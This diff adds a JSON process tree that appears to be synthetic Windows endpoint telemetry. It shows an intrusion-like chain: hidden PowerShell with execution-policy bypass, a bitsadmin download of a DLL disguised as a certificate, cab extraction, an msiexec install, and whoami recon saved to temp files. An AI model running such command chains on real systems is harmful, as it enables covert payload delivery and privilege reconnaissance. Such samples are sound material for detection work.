@@ -1,0 +1,229 @@
+{
+  "pid": 86096,
+  "ppid": 0,
+  "name": "services.exe",
+  "command": "services.exe -k netsvcs",
+  "children": [
+    {
+      "pid": 86100,
+      "ppid": 86096,
+      "name": "powershell.exe",
+      "command": "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File \"C:\\IT\\Scripts\\ProfileInit_2d0e3fb4.ps1\" -Host \"SUP-757\" -Mode Verify",
+      "children": [
+        {
+          "pid": 86104,
+          "ppid": 86100,
+          "name": "bitsadmin.exe",
+          "command": "bitsadmin.exe /transfer Jobd5c9fb87 /download /priority NORMAL \"http://pkirelay.corp.local/tools/helper.dll\" \"C:\\Users\\suresh.nair\\AppData\\Local\\Temp\\root.cer\"",
+          "children": [
+            {
+              "pid": 86105,
+              "ppid": 86104,
+              "name": "hostname.exe",
+              "command": "hostname.exe",
+              "children": [
+                {
+                  "pid": 86106,
+                  "ppid": 86105,
+                  "name": "bitsadmin.exe",
+                  "command": "bitsadmin.exe /info Job80b13b56 /verbose",
+                  "children": [
+                    {
+                      "pid": 86110,
+                      "ppid": 86106,
+                      "name": "choice.exe",
+                      "command": "choice.exe /d y /t 7 > nul",
+                      "children": [
+                        {
+                          "pid": 86113,
+                          "ppid": 86110,
+                          "name": "powershell.exe",
+                          "command": "powershell.exe -NoProfile -WindowStyle Hidden -Command \"Start-Sleep -Seconds 12\"",
+                          "children": [
+                            {
+                              "pid": 86120,
+                              "ppid": 86113,
+                              "name": "bitsadmin.exe",
+                              "command": "bitsadmin.exe /info Job96c72d05 /verbose",
+                              "children": [
+                                {
+                                  "pid": 86126,
+                                  "ppid": 86120,
+                                  "name": "hostname.exe",
+                                  "command": "hostname.exe",
+                                  "children": [
+                                    {
+                                      "pid": 86129,
+                                      "ppid": 86126,
+                                      "name": "bitsadmin.exe",
+                                      "command": "bitsadmin.exe /info Job76ebd2d2 /verbose",
+                                      "children": []
+                                    }
+                                  ]
+                                }
+                              ]
+                            }
+                          ]
+                        }
+                      ]
+                    },
+                    {
+                      "pid": 86134,
+                      "ppid": 86106,
+                      "name": "findstr.exe",
+                      "command": "findstr.exe /i \"task\" \"C:\\ProgramData\\BlueYonder\\Logs\\support.log\"",
+                      "children": [
+                        {
+                          "pid": 86137,
+                          "ppid": 86134,
+                          "name": "extrac32.exe",
+                          "command": "extrac32.exe /Y \"C:\\Users\\suresh.nair\\AppData\\Local\\Temp\\tools.cab\" /E /L \"C:\\ProgramData\\BlueYonder\\Patch\"",
+                          "children": [
+                            {
+                              "pid": 86141,
+                              "ppid": 86137,
+                              "name": "whoami.exe",
+                              "command": "whoami.exe /priv",
+                              "children": [
+                                {
+                                  "pid": 86146,
+                                  "ppid": 86141,
+                                  "name": "whoami.exe",
+                                  "command": "whoami.exe /priv",
+                                  "children": [
+                                    {
+                                      "pid": 86147,
+                                      "ppid": 86146,
+                                      "name": "hostname.exe",
+                                      "command": "hostname.exe > \"C:\\Users\\suresh.nair\\AppData\\Local\\Temp\\host_10fe6c13.txt\"",
+                                      "children": [
+                                        {
+                                          "pid": 86151,
+                                          "ppid": 86147,
+                                          "name": "cmd.exe",
+                                          "command": "cmd.exe /k \"hostname\"",
+                                          "children": [
+                                            {
+                                              "pid": 86158,
+                                              "ppid": 86151,
+                                              "name": "hostname.exe",
+                                              "command": "hostname.exe",
+                                              "children": [
+                                                {
+                                                  "pid": 86165,
+                                                  "ppid": 86158,
+                                                  "name": "hostname.exe",
+                                                  "command": "hostname.exe",
+                                                  "children": [
+                                                    {
+                                                      "pid": 86169,
+                                                      "ppid": 86165,
+                                                      "name": "msiexec.exe",
+                                                      "command": "msiexec.exe /i \"C:\\Users\\Public\\bridge.msi\" /qb /l*v \"C:\\ProgramData\\Northwind\\Logs\\msi_a5806a46.log\"",
+                                                      "children": [
+                                                        {
+                                                          "pid": 86176,
+                                                          "ppid": 86169,
+                                                          "name": "findstr.exe",
+                                                          "command": "findstr.exe /i \"WARN\" \"C:\\ProgramData\\Northwind\\Logs\\diag.log\"",
+                                                          "children": [
+                                                            {
+                                                              "pid": 86178,
+                                                              "ppid": 86176,
+                                                              "name": "findstr.exe",
+                                                              "command": "findstr.exe /i \"WARN\" \"C:\\ProgramData\\Northwind\\Logs\\deploy.log\"",
+                                                              "children": [
+                                                                {
+                                                                  "pid": 86184,
+                                                                  "ppid": 86178,
+                                                                  "name": "whoami.exe",
+                                                                  "command": "whoami.exe /groups",
+                                                                  "children": [
+                                                                    {
+                                                                      "pid": 86203,
+                                                                      "ppid": 86184,
+                                                                      "name": "findstr.exe",
+                                                                      "command": "findstr.exe /i \"task\" \"C:\\ProgramData\\Woodgrove\\Logs\\support.log\"",
+                                                                      "children": [
+                                                                        {
+                                                                          "pid": 86205,
+                                                                          "ppid": 86203,
+                                                                          "name": "ping.exe",
+                                                                          "command": "ping.exe -n 23 127.0.0.1 > nul",
+                                                                          "children": [
+                                                                            {
+                                                                              "pid": 86207,
+                                                                              "ppid": 86205,
+                                                                              "name": "whoami.exe",
+                                                                              "command": "whoami.exe /all",
+                                                                              "children": []
+                                                                            }
+                                                                          ]
+                                                                        }
+                                                                      ]
+                                                                    }
+                                                                  ]
+                                                                }
+                                                              ]
+                                                            }
+                                                          ]
+                                                        }
+                                                      ]
+                                                    }
+                                                  ]
+                                                }
+                                              ]
+                                            }
+                                          ]
+                                        }
+                                      ]
+                                    }
+                                  ]
+                                }
+                              ]
+                            }
+                          ]
+                        }
+                      ]
+                    }
+                  ]
+                }
+              ]
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "pid": 86189,
+      "ppid": 86096,
+      "name": "whoami.exe",
+      "command": "whoami.exe /groups > \"C:\\Users\\suresh.nair\\AppData\\Local\\Temp\\who_c5cacee3.txt\"",
+      "children": [
+        {
+          "pid": 86191,
+          "ppid": 86189,
+          "name": "whoami.exe",
+          "command": "whoami.exe /all > \"C:\\Users\\suresh.nair\\AppData\\Local\\Temp\\who_c1c4e9f7.txt\"",
+          "children": [
+            {
+              "pid": 86195,
+              "ppid": 86191,
+              "name": "whoami.exe",
+              "command": "whoami.exe /priv > \"C:\\Users\\suresh.nair\\AppData\\Local\\Temp\\who_9e1c4b0e.txt\"",
+              "children": [
+                {
+                  "pid": 86199,
+                  "ppid": 86195,
+                  "name": "hostname.exe",
+                  "command": "hostname.exe",
+                  "children": []
+                }
+              ]
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
